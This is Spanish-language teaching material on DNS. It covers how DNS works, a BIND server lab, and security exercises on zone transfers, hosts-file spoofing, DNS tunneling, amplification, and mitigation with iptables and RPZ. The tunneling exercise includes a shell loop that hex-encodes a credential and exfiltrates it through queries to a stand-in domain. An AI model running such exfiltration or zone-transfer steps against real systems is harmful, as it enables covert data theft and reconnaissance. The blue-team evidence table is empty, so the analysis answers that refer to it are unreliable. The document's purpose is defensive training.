Sistema DNS

El Sistema de Nombres de Dominio (DNS) es la infraestructura que permite a Internet funcionar de manera intuitiva para los humanos. Esencialmente, actúa como la guía telefónica de Internet, traduciendo los nombres de dominio fáciles de recordar (como google.com) a las direcciones IP numéricas (como 142.250.67.14) que las máquinas utilizan para comunicarse.

Nombres de Dominio

Un nombre de dominio es una dirección legible por humanos que se utiliza para identificar un sitio web en Internet. Está compuesto por varias partes, separadas por puntos, y cada parte tiene un significado específico. Por ejemplo, en el nombre de dominio "www.ejemplo.com", "www" es un subdominio, "ejemplo" es el nombre del dominio, y "com" es el dominio de nivel superior (TLD).

Los nombres de dominio pueden estar formados por una o más cadenas de caracteres separadas por puntos y no se distingue entre mayúsculas y minúsculas. Por ejemplo, www.google.es que WWW.GooGle.ES

Dominio raíz

Los dominios raíz son los niveles más altos en la jerarquía de nombres de dominio. El único dominio raíz es ".", que representa la raíz del árbol de nombres de dominio. En la práctica, los dominios raíz no se utilizan directamente, sino que se utilizan los dominios de nivel superior (TLD) como ".com", ".org", ".net", etc.

Un dominio se lee de derecha a izquierda, empezando por el punto ., aunque en la práctica lo hacemos de izquierda a derecha. El punto inicial, generalmente se omite ya que los programas lo añaden por defecto y es meramente formal, pero en ocasiones, será necesario que indiquemos el nombre de dominio completo incluyendo el dominio raíz, es lo que se conoce como nombres de dominio completos (Fully Qualified Domain Names, FQDN).

Durante una consulta DNS sin caché, cada vez que un usuario introduce una dirección web en su navegador, esta acción desencadena una búsqueda DNS, y todas las búsquedas DNS comienzan en la zona raíz Una vez que la búsqueda llega a la zona raíz, la búsqueda bajará en la jerarquía del sistema DNS, alcanzando primero los servidores de TLD, luego los servidores para dominios específicos (y posiblemente los subdominios), hasta que acabe llegando al servidor de nombres autoritativo para el dominio correcto, que contiene la dirección IP numérica del sitio web que se está buscando. Esta dirección IP se devuelve entonces al cliente. Es interesante que, a pesar del número de pasos necesarios, este proceso puede ocurrir muy rápido. Los servidores raíz son una parte fundamental de la infraestructura de Internet; sin estos no funcionarían ni los navegadores web ni muchas otras herramientas de Internet. Hay 13 direcciones IP diferentes que sirven a la zona raíz de DNS, y existen cientos de servidores raíz redundantes en todo el mundo para gestionar las solicitudes a la zona raíz.

El mito de las 13 direcciones raíz.

Es un mito común que solo hay 13 servidores raíz de DNS en todo el mundo. En realidad, hay 13 direcciones IP diferentes que representan a los servidores raíz, pero cada una de estas direcciones IP puede estar respaldada por múltiples servidores físicos distribuidos globalmente. Esto significa que, aunque solo haya 13 direcciones IP, hay muchos más servidores raíz en funcionamiento para garantizar la redundancia y la disponibilidad. El número 13 no fue un capricho administrativo, sino una limitación matemática. En los inicios del DNS, el tamaño máximo de un paquete de datos UDP para garantizar que no se fragmentara en la red era de 512 bytes. Tras acomodar la estructura básica del protocolo, el espacio sobrante solo permitía listar exactamente 13 direcciones IPv4. Hoy en día, esas 13 direcciones IP actúan como "máscaras". Cuando tu red hace una consulta a una de ellas, los routers no te envían a una única máquina central, sino a la copia física de ese servidor que geográficamente esté más cerca de ti. Esto hace que el sistema sea increíblemente rápido y resistente a ataques.

Hoy en día existen más de 1,700 instancias físicas de estos servidores raíz repartidas por todo el planeta. Si alguna vez tienes curiosidad, entidades como root-servers.org mantienen un mapa en tiempo real con la ubicación exacta de cada uno de ellos.

Resource Records

Los registros de recursos (Resource Records, RR) son la unidad básica de información en el sistema DNS. Cada registro de recursos contiene información sobre un dominio específico y su correspondiente dirección IP u otros datos relacionados. Los registros de recursos se almacenan en los servidores DNS y se utilizan para responder a las consultas de los clientes.

Cada RR es una línea de datos que contiene información sobre el dominio, como su dirección IP, los servidores de correo, los servidores autoritativos, etc. Existen varios tipos de registros de recursos, cada uno con un propósito específico.

En el contexto de DNS, un RR sigue una estructura básica:

Nombre TTL Clase Tipo Datos
  • Nombre: El nombre del dominio al que se refiere el registro.
  • TTL: El tiempo de vida del registro, indicando cuánto tiempo debe ser cacheado.
  • Clase: La clase de red a la que pertenece el registro (generalmente IN para Internet).
  • Tipo: El tipo de registro (A, AAAA, CNAME, MX, etc.).
  • Datos: La información específica asociada al tipo de registro.

Algunos de los tipos de registros más comunes incluyen:

Tipo RR Descripción
A Asocia un nombre de dominio con una dirección IPv4.
AAAA Asocia un nombre de dominio con una dirección IPv6.
CNAME Alias de un nombre de dominio a otro nombre de dominio.
MX Especifica los servidores de correo para el dominio.
NS Indica los servidores de nombres autoritativos para el dominio.
TXT Permite almacenar texto arbitrario, a menudo usado para verificación y políticas.
SOA Contiene información sobre el servidor de nombres autoritativo para el dominio.

Tendremos algunas herramientas para consultar registros DNS:

  • nslookup: Herramienta de línea de comandos para consultar registros DNS.
  • dig: Herramienta más avanzada para realizar consultas DNS detalladas.
  • host: Herramienta simple para obtener información de direcciones IP y registros DNS.

Consultas DNS

Una consulta DNS es el proceso mediante el cual un cliente (como un navegador web) solicita información sobre un nombre de dominio a un servidor DNS. Este proceso es esencial para traducir nombres de dominio legibles por humanos en direcciones IP que las computadoras pueden entender y utilizar para establecer conexiones.

Vamos a estudiar los diferentes tipos de consultas DNS y cómo se utilizan en la práctica. Para ello, tenemos que estudiar algunos conceptos clave:

  • Resolutor DNS (DNS Resolver): Es el cliente que realiza las consultas DNS y gestiona la resolución de nombres.
  • Servidor DNS recursivo: Es el servidor que responde a las consultas DNS, proporcionando la información solicitada.
  • Servidor Raíz (root server): Es el servidor DNS más alto en la jerarquía, que responde a las consultas sobre dominios de primer nivel. Es el punto de partida de la búsqueda.
  • Servidor TLD (Top-Level-Domain): Es el servidor que gestiona los dominios de primer nivel (como .com, .org, .net).
  • Servidor DNS autoritativo: Es el servidor que tiene la autoridad sobre un dominio específico y proporciona respuestas definitivas a las consultas. Es decir, devuelve la IP final.

Consultas recursivas e iterativas

Consulta recursiva

Una consulta recursiva es aquella en la que el servidor DNS da una respuesta completa o exacta. Pueden darse tres tipos de respuesta:

  • Positivas: se devuelve información sobre el dominio consultado
  • Negativas: no se puede resolver el nombre de dominio.
  • Error: se produce un fallo en la red.
    • ¡

Consulta iterativa

Una consulta iterativa es aquella en la que el servidor DNS proporciona una respuesta parcial. Existen cuatro posibles respuestas:

  • Positivas: se devuelve información sobre el dominio consultado
  • Negativas: no se puede resolver el nombre de dominio.
  • Referencia: el servidor DNS indica a otros servidores a los que se les puede sonsultar para
  • Error: se produce un fallo en la red.
    • ¡

Práctica DNS: Configuración de un servidor DNS

En esta práctica, vamos a configurar un servidor DNS utilizando BIND (Berkeley Internet Name Domain), que es uno de los servidores DNS más populares y ampliamente utilizados en sistemas Linux. A continuación, se detallan los pasos para configurar un servidor DNS básico.

  1. Instalar el paquete de BIND

    2. sudo apt-get install bind9

  2. Configurar el archivo de zona principal

    3. sudo nano /etc/bind/named.conf.local

    Agrega la configuración de la zona para tu dominio:

    
zone "aula.test" {
    type master;
    file "/etc/bind/db.aula.test";
};

  3. Configurar el archivo de configuración del servidor DNS

    4. sudo nano /etc/bind/named.conf.options

    Agrega las opciones de configuración necesarias, como la dirección IP del servidor y las opciones de reenvío:

    
options {
    directory "/var/cache/bind";
    forwarders {
        8.8.8.8;
        8.8.4.4;
    };
};

  4. Crear el archivo de zona para el dominio aula.test

    5. sudo nano /etc/bind/db.aula.test

    Agrega los registros de recursos necesarios para tu dominio:

    
;
; Archivo de zona para aula.test
;
$TTL 604800
@ IN SOA ns1.aula.test. root.aula.test. (
    2025110503 ; Serial (Aumentar con cada cambio)
    10800      ; Refresh
    3600       ; Retry
    604800     ; Expire
    60         ; Negative Cache TTL
)

; Servidores de Nombres
@   IN  NS  ns1.aula.test.

; Mapeos de Direcciones (Registros A)
; **NOTA:** Todos los registros apuntan a 127.0.0.1 (localhost).
ns1 IN  A   127.0.0.1
@   IN  A   127.0.0.1
www IN  A   127.0.0.1
  5. Iniciar y habilitar el servicio DNS

    6. sudo systemctl start bind9
sudo systemctl enable bind9

  6. Verificar la configuración

    7. sudo named-checkconf
sudo named-checkzone "aula.test" /etc/bind/db.aula.test

  7. Probar la resolución de nombres

    8. dig @localhost aula.test

Es importante tener en cuenta que la configuración de un servidor DNS puede variar según la distribución de Linux y la versión de BIND que se esté utilizando. Asegúrate de consultar la documentación oficial de BIND y seguir las mejores prácticas de seguridad al configurar tu servidor DNS.

¿Hay alguna manera de seguir las consultas que hace el servidor DNS?

Para seguir las consultas que hace el servidor DNS, puedes habilitar el registro de consultas en BIND. Esto te permitirá ver qué consultas se están realizando y cómo se están resolviendo. A continuación, se detallan los pasos para habilitar el registro de consultas:

  1. Editar el archivo de configuración de BIND

    2. sudo nano /etc/bind/named.conf.options

  2. Agregar la configuración de registro

    3. Dentro del bloque options, agrega la siguiente línea para habilitar el registro de consultas: 

    logging {
    category queries { default; };
};

Esto configurará BIND para registrar todas las consultas DNS en el archivo de registro predeterminado.

  1. Reiniciar el servicio BIND

    2. sudo systemctl restart bind9

  2. Verificar los registros de consultas

    3. Los registros de consultas se almacenarán en el archivo de registro predeterminado de BIND, que generalmente se encuentra en /var/log/syslog o /var/log/messages, dependiendo de la configuración del sistema. Puedes usar el comando tail para ver las últimas entradas del registro:

    sudo tail -f /var/log/syslog

Con esto, podrás seguir las consultas que hace el servidor DNS en tiempo real y analizar cómo se están resolviendo los nombres de dominio.

Práctica DNS: DNS en la cadena de ataque (kill chain)

DNS no es sólo un servicio, sino también un punto crítico de seguridad porque muchos tipos de ataques, salvo los que funcionan sobre IP directamente, dependen de él.

Vamos a ver y ejecutar en la terminal las distintas fases de un posible ciberataque a través de DNS:

Fase de la ciberseguridad Riesgo Nombre del ataque
Footprinting (reconocimiento) El atacante utiliza herramientas como dig o intenta una transferencia de zona no autorizada para obtener un mapa completo de la infraestructura (subdominios, IPs internas, servidores de correo, etc.). DNS Zone Transfer Attack
Entrega y explotación El atacante manipula la resolución de nombres o engaña al usuario para redirigir a la víctima a un sitio web malicioso donde se aloja el malware o se capturan credenciales. DNS Cache Poisoning
DNS Spoofing
Instalación y comando y control El atacante encapsula protocolos (como SSH) o datos dentro de consultas DNS legítimas (generalmente en registros TXT o subdominios). Crea un canal encubierto que evade firewalls para controlar el host o exfiltrar datos. DNS Tunneling
Denegación de Servicio El atacante falsifica la IP de origen (usando la de la víctima) y abusa de servidores DNS abiertos, generando una respuesta de tráfico masiva hacia la IP objetivo. DNS Amplification Attack con DDoS

Nota: En la fase 3 (C2), el DNS Tunneling funciona extremadamente bien porque los firewalls corporativos suelen permitir el tráfico de salida por el puerto 53 (UDP/TCP) por defecto. Utilizar subdominios o registros TXT para transportar payloads codificados (en Hexadecimal o Base64) ilustra perfectamente cómo se logra esta exfiltración.

1. Footprinting (reconocimiento)

dig (Domain Information Groper) es la herramienta fundamental en terminal para cualquier técnico de ciberseguridad o administrador de red. Abre tu terminal y ejecuta los siguientes ejercicios prácticos:

Paso 1.1: Consulta básica de un registro A y TTL (tiempo de vida)

Obtén la dirección IP asignada a un dominio y cuánto tiempo se almacena en caché (TTL), un factor clave durante ataques de phishing o secuestro temporal. Ejecuta en tu terminal:

dig google.com A +noall +answer

Observa tu salida (será similar a esta):

google.com. 300 IN A 142.250.191.14
  • Registro A: Confirma la IP final. En una investigación de phishing, te permite verificar si el dominio apunta a un servidor legítimo o a uno controlado por el atacante.
  • TTL (300): Indica 300 segundos (5 minutos) de vida en caché. Si un atacante modifica esta IP, el cambio tardará un máximo de 5 minutos en propagarse.

Paso 1.2: Identificación de Servidores de Nombres (NS)

Descubre qué servidores DNS son los responsables autoritativos de un dominio para mapear dónde reside su infraestructura:

dig google.com NS +noall +answer

Salida en terminal:

google.com. 300 IN NS ns1.google.com.
google.com. 300 IN NS ns2.google.com.

Paso 1.3: Ejecución de una transferencia de zona (AXFR)

En una infraestructura real, una empresa nunca tiene un único servidor DNS; suele tener un servidor Maestro (Primario) y uno o varios servidores Esclavos (Secundarios) por redundancia.

Cuando el administrador añade un nuevo subdominio en el servidor Maestro, los servidores Esclavos necesitan actualizarse. Para ello, le envían una petición especial llamada AXFR (Authoritative Zone Transfer, que opera por TCP en el puerto 53 en lugar del habitual UDP) diciéndole: "Pásame una copia completa de todos los registros de este dominio".

El fallo de seguridad: Si el administrador no filtra qué direcciones IP tienen permiso para hacer peticiones AXFR, el servidor Maestro le entregará el listado completo de la empresa a cualquier persona en Internet que se lo pida. Sin esto, un atacante tendría que adivinar los subdominios a ciegas mediante fuerza bruta con diccionarios.

Si un servidor DNS está mal configurado, permitirá a cualquiera descargar toda la lista de subdominios e IPs internas de la empresa mediante una consulta AXFR. Vamos a realizar la prueba contra el dominio de laboratorio zonetransfer.me. Este es un dominio real mantenido por el especialista en seguridad Robin Wood (DigiNinja) específicamente para practicar esta vulnerabilidad de forma legal.

1. Primero, averigua cuáles son sus servidores de nombres:

dig zonetransfer.me NS +short

2. Ahora, solicita la transferencia de zona completa apuntando a uno de los servidores obtenidos (por ejemplo, nsztm1.digi.ninja):

dig @nsztm1.digi.ninja zonetransfer.me AXFR
  • Análisis del resultado: Verás en tu terminal decenas de registros internos expuestos (subdominios de oficinas, servidores de pruebas, registros TXT con información sensible, etc.).
  • Mitigación: En el archivo de configuración del servidor DNS (ej. named.conf en BIND), se debe restringir la directiva allow-transfer exclusivamente a las IPs de los servidores DNS secundarios autorizados.

2. Entrega y explotación: Suplantación DNS (Spoofing) y validación DNSSEC

En esta fase simularemos en nuestra propia máquina cómo un atacante redirige el tráfico manipulando la resolución local y aprenderemos a detectar la discrepancia desde la terminal y a verificar firmas criptográficas con DNSSEC.

Paso 2.1: Simulación y detección de secuestro de resolución local

Muchos troyanos modifican el fichero /etc/hosts de la víctima para suplantar páginas bancarias o portales corporativos sin tocar el servidor DNS de la red.

1. Introduce un registro falso apuntando un dominio de prueba a una IP reservada para documentación (192.0.2.77):

echo "192.0.2.77 example.com" | sudo tee -a /etc/hosts

2. Comprueba a dónde se conecta tu sistema si intentas alcanzar el dominio:

ping -c 1 example.com

Verás que responde la IP falsa (192.0.2.77). Como analista, para diagnosticar si el envenenamiento está en tu equipo o en la red, contrasta la respuesta local con la de un servidor DNS externo de confianza (como el de Cloudflare 1.1.1.1) usando dig (que ignora /etc/hosts):

dig @1.1.1.1 example.com A +short

3. Al ver que dig devuelve las IPs legítimas de example.com pero ping va a 192.0.2.77, confirmas la manipulación local. Limpia el escenario eliminando la línea añadida:

sudo sed -i '/192.0.2.77 example.com/d' /etc/hosts

Paso 2.2: Verificación activa de DNSSEC en terminal

Para evitar que el envenenamiento ocurra en el propio servidor DNS (Cache Poisoning), se utiliza DNSSEC. Vamos a comprobar en la terminal cómo responde un resolver cuando la firma criptográfica está autenticada frente a cuando ha sido manipulada o está rota.

1. Consulta un dominio firmado correctamente pidiendo validación DNSSEC. Fíjate en la línea de flags de la cabecera:

dig @1.1.1.1 cloudflare.com A +dnssec

Busca en la salida: flags: qr rd ra ad;. El flag ad (Authenticated Data) confirma que el servidor DNS ha validado criptográficamente la cadena de confianza (registros DNSKEY y firma RRSIG).

2. Ahora consulta un dominio de laboratorio diseñado con una firma DNSSEC inválida o corrupta:

dig @1.1.1.1 dnssec-failed.org A

Observa que obtienes un estado status: SERVFAIL y no se devuelve ninguna IP. El resolver nos ha protegido bloqueando una respuesta cuya autenticidad no pudo verificar.

3. Si repites el comando añadiendo el flag +cd (Checking Disabled), desactivarás la protección DNSSEC y verás la IP sin validar:

dig @1.1.1.1 dnssec-failed.org A +cd

3. Instalación y Comando y Control (C2): Exfiltración y detección de DNS Tunneling

En este ejercicio actuaremos en dos terminales simultáneas: en la Terminal 1 seremos el analista del SOC monitorizando la red en vivo con tcpdump, y en la Terminal 2 simularemos cómo el malware trocea información confidencial y la saca de la empresa escondida en consultas DNS.

Paso 3.1: Poner la sonda de red en escucha (Terminal 1 - Defensor)

Abre una terminal y ejecuta tcpdump para capturar en tiempo real todas las consultas DNS que contengan nuestro dominio de laboratorio (tunel-c2.test):

sudo tcpdump -i any -n port 53 and udp | grep --line-buffered "tunel-c2.test"

Paso 3.2: Exfiltrar datos por DNS y reconstruirlos (Terminal 2 - Atacante)

Abre una segunda terminal. Imagina que hemos robado la cadena clave_root:Admin2026! y el firewall bloquea todo salvo el puerto 53. Vamos a codificarla en hexadecimal, dividirla en fragmentos y enviarla como subdominios en consultas DNS:

for bloque in $(echo -n "clave_root:Admin2026!" | xxd -p -c 6); do
  dig @1.1.1.1 ${bloque}.tunel-c2.test TXT +short > /dev/null
  sleep 1
done

Mira la Terminal 1 mientras se ejecuta el bucle. Verás aparecer una ráfaga de consultas como estas:

IP X.X.X.X > 1.1.1.1.53: A? 636c6176655f.tunel-c2.test.
IP X.X.X.X > 1.1.1.1.53: A? 726f6f743a41.tunel-c2.test.
IP X.X.X.X > 1.1.1.1.53: A? 646d696e3230.tunel-c2.test.
IP X.X.X.X > 1.1.1.1.53: A? 323621.tunel-c2.test.

Análisis forense: Como analista, si copias esos subdominios hexadecimales capturados en tcpdump y los decodificas en tu terminal, descubrirás exactamente qué dato ha sido exfiltrado:

echo "636c6176655f726f6f743a41646d696e3230323621" | xxd -r -p ; echo ""
  • Indicadores de alerta: Alta entropía en los subdominios (cadenas hexadecimales o Base64 aleatorias), alta frecuencia de consultas a un mismo dominio desconocido y uso constante de registros TXT o CNAME.

4. Denegación de servicio: Auditoría de Amplificación DNS y Mitigación

En un ataque de amplificación DNS, el atacante envía una consulta muy pequeña (con la IP de la víctima falsificada) que genera una respuesta enorme. Vamos a medir empíricamente este factor de amplificación en nuestra terminal y a configurar reglas de cortafuegos para mitigarlo.

Paso 4.1: Medición práctica del factor de amplificación

1. Realiza una consulta mínima estándar (registro A) y fíjate en la línea final MSG SIZE rcvd:

dig @1.1.1.1 isc.org A | grep "MSG SIZE"

Verás un tamaño de respuesta pequeño, de unos 50 a 65 bytes.

2. Ahora solicita los registros criptográficos DNSKEY habilitando DNSSEC y un buffer EDNS0 grande (+bufsize=4096):

dig @1.1.1.1 isc.org DNSKEY +dnssec +bufsize=4096 | grep "MSG SIZE"

Observa cómo el tamaño recibido (MSG SIZE rcvd) se dispara por encima de los 1.500 - 2.000 bytes con una sola petición de apenas 60 bytes. Si miles de servidores abiertos responden ese volumen hacia una IP suplantada, tumban su conexión por saturación de ancho de banda.

Paso 4.2: Auditoría del host y mitigación con Rate Limiting (iptables)

1. Comprueba en tu terminal si tu máquina tiene algún proceso escuchando en el puerto 53 que pudiera ser abusado como resolver abierto:

sudo ss -tulnp | grep ":53 "

2. Además de deshabilitar la recursión externa en el servidor DNS (recursion no; o allow-recursion en BIND), podemos aplicar una regla de contención en el firewall de Linux (iptables) para bloquear IPs que superen un umbral de consultas DNS por segundo (por ejemplo, más de 10 consultas por segundo):

sudo iptables -A INPUT -p udp --dport 53 -m hashlimit --hashlimit-name DNS_LIMIT --hashlimit-above 10/sec --hashlimit-burst 20 --hashlimit-mode srcip -j DROP

3. Verifica que la regla de protección está activa en la tabla de filtrado:

sudo iptables -L INPUT -v -n | grep "53"

(Para eliminar la regla al terminar la práctica, basta con ejecutar el mismo comando del punto 2 cambiando -A INPUT por -D INPUT).

Práctica: Investigación de alarma DNS Tunneling

La mejor manera de entender la ciberseguridad del DNS es verlo a través de un ejemplo práctico.

Objetivo: Simular un análisis forense de red para identificar, diagnosticar y mitigar un posible ataque de exfiltración de datos mediante un túnel DNS.

Vamos a imaginar que formamos parte de un equipo de ciberseguridad (blue team) de una empresa. El sistema de detección de intrusiones (IDS) ha activado una alerta por "actividad anómala DNS" proveniente de un host interno (ip: 192.168.1.50).

Los datos que debemos tener en cuenta:

  1. Origen de la actividad anómala (dirección IP del host interno)
  2. Tipos de consultas DNS realizadas (por ejemplo, A, AAAA, MX)
  3. Frecuencia y horario de las consultas
  4. Dominios consultados (especialmente aquellos fuera del ámbito normal de la organización)

El análisis de las consultas DNS puede revelar patrones sospechosos que indican la presencia de un túnel DNS. Para realizar el análisis, podemos utilizar herramientas como Wireshark para capturar y analizar el tráfico de red, y dig para realizar consultas DNS manuales. Vamos a imaginar que hemos capturado el tráfico de red y hemos filtrado solo las consultas DNS generadas por el host potencialmente infectado 192.168.1.50.

El resumen de los resultados del análisis sería el siguiente:

Host Origen Servidor Destino Tipo de Consulta Dominio Consultado

Preguntas del análisis:

  • ¿Cuál es la anomalía principal en los nombres de dominio consultados, en comparación con una consulta normal (ej. login.google.com)?

    • Respuesta: Los nombres de dominio consultados son poco comunes y parecen ser generados aleatoriamente, en contraste con dominios legítimos como login.google.com. Los tres primeros dominios emplean técnicas de leetspeak o reemplazo de letras por números que son comunes en la ciberdelincuencia para evitar la detección por sistemas automatizados y, a la vez, comunicar un significado claro a un analista.

  • ¿Por qué un atacante dejaría nombres de dominio tan obvios?
    • Ataques de Baja Sofisticación (Script Kiddies o Pruebas) Algunos atacantes, a menudo llamados script kiddies (atacantes novatos que usan scripts prefabricados) o aquellos que están en la fase de prueba de una nueva infraestructura C2, no invierten tiempo en ofuscar el nombre. Si el objetivo es un entorno de red poco supervisado, un nombre obvio puede funcionar temporalmente.
    • Uso de Tácticas de "Ruido" (Noise) A veces, un atacante usa dominios escandalosos como parte de una estrategia para inundar los logs del sistema. Si hay cien peticiones a dominios "obvios", el analista podría enfocarse solo en esos, mientras que la verdadera exfiltración ocurre a través de un dominio más sutil o conocido. Es una forma de distraer la atención.
    • Explotación de Protocolos de Exfiltración (DNS Tunneling) En tu caso específico, el uso de nombres largos y estructurados como 3xfiltr4t3d4t4.exfiltration-c2.com es típico del DNS Tunneling. El objetivo aquí no es ser sigiloso en el nombre del dominio, sino esconder los datos robados dentro del propio protocolo DNS. Los atacantes codifican los datos (como una contraseña o un archivo) y los dividen en pequeños bloques. Cada bloque se convierte en un subdominio único para la consulta. Aunque el dominio raíz (exfiltration-c2.com) es muy sospechoso, el nombre se elige para que sea descriptivo para el propio atacante o para el malware, no para la víctima. Confían en que la petición DNS, en sí misma, pasará desapercibida como tráfico de red normal.
    • Nombres "Quemados" (Burner Domains) El atacante puede saber que el dominio será detectado rápidamente, por lo que lo utiliza como un dominio desechable (un burner). Lo usan para una exfiltración rápida y luego lo abandonan, migrando a una nueva infraestructura antes de que la víctima pueda reaccionar por completo. En resumen, aunque un atacante experimentado no elegiría un dominio tan llamativo para una persistencia a largo plazo, en la práctica, los dominios son obvios cuando se usan como parte de una técnica de DNS Tunneling o como un activo de corta duración.
  • ¿Por qué un atacante elegiría el protocolo DNS para este tipo de comunicación (Comando y Control o Exfiltración)?

    Respuesta: DNS es un protocolo que rara vez se bloquea o inspecciona a fondo en los firewalls de salida (especialmente el puerto UDP/53), lo que permite al atacante pasar desapercibido.

  • Además del registro A (para una IP), ¿por qué el atacante usaría un registro de tipo TXT?

    • Respuesta: Los registros TXT pueden transportar texto en una respuesta y, según el diseño del túnel, servir para intercambiar datos. Su tamaño no es ilimitado y depende de las restricciones de DNS y de la implementación.

Implementación de la mitigación.

Sabiendo que el atacante tiene el control del host, vamos a proponer una implementación para la mitigación de daños. Para ello, debemos hacernos la siguiente pregunta: ¿Qué mecanismo de defensa a nivel de DNS es el más efectivo para cortar inmediatamente la comunicación C2 del dominio exfiltration-c2.com?

Una medida es implementar una Response Policy Zone (RPZ) en el servidor DNS interno (192.168.1.1) para que devuelva NXDOMAIN (dominio no existe) o la IP de un sinkhole (una IP local y segura) para las consultas al dominio exfiltration-c2.com. Esta medida depende de que los equipos utilicen ese resolver.

¿Qué es una RPZ? Una RPZ (Response Policy Zone) es una zona DNS de políticas de respuesta: un conjunto de reglas que un servidor DNS aplica a determinadas consultas antes de devolver la respuesta normal. En lugar de resolver un dominio malicioso como exfiltration-c2.com de manera convencional, el resolver puede devolver NXDOMAIN, una IP de sinkhole o una dirección segura definida por la política. Esto permite bloquear dominios de C2, malware, phishing o exfiltración sin desactivar por completo el servicio DNS.

La RPZ se suele alimentar con listas de dominios bloqueados o indicadores de compromiso y se configura en el resolver interno (por ejemplo, el 192.168.1.1). Cuando el host intenta consultar un nombre incluido en la política, el servidor no entrega la resolución legítima, sino que aplica la acción definida por la regla. En otras palabras, una RPZ es una capa de control activo sobre el DNS: corta la resolución del dominio malicioso y puede interrumpir la comunicación con la infraestructura del atacante. No sustituye la limpieza del host comprometido y puede eludirse si este utiliza resolutores externos u otros canales.

Vamos a configurar la RPZ en el servidor DNS interno. El siguiente ejemplo es para BIND; adapta las rutas y el nombre del servicio a la distribución utilizada. En el bloque options de named.conf, activa la política y declara la zona: 


        options {
            response-policy { zone "rpz"; };
        };

        zone "rpz" {
            type master;
            file "/etc/bind/db.rpz";
            allow-query { none; };
        };

Crea el archivo /etc/bind/db.rpz. La primera regla bloquea el dominio raíz y la segunda sus subdominios. En BIND, CNAME . hace que la RPZ responda con NXDOMAIN:


        $TTL 60
        @       IN SOA  localhost. root.localhost. (
                        2025020101 ; serial: incrementar cada vez que se edite la zona
                        1h         ; refresh
                        15m        ; retry
                        1w         ; expire
                        60         ; negative cache TTL
                )
                IN NS   localhost.
        exfiltration-c2.com.       CNAME .
        *.exfiltration-c2.com.     CNAME .

Valida la configuración y el archivo de zona antes de recargar el servicio:


        sudo named-checkconf
        sudo named-checkzone rpz /etc/bind/db.rpz
        sudo rndc reload

Comprueba el bloqueo consultando el resolver interno; tanto el dominio como un subdominio deberían devolver NXDOMAIN:


        dig @192.168.1.1 exfiltration-c2.com A
        dig @192.168.1.1 prueba.exfiltration-c2.com TXT

Si la validación falla, corrige el archivo y vuelve a comprobarlo antes de recargar. Supervisa los registros DNS y asegúrate de que los equipos utilizan el resolver gestionado; controlar el DNS saliente ayuda a evitar que recurran a resolutores externos. La RPZ no sustituye la limpieza del host comprometido ni la investigación del incidente.
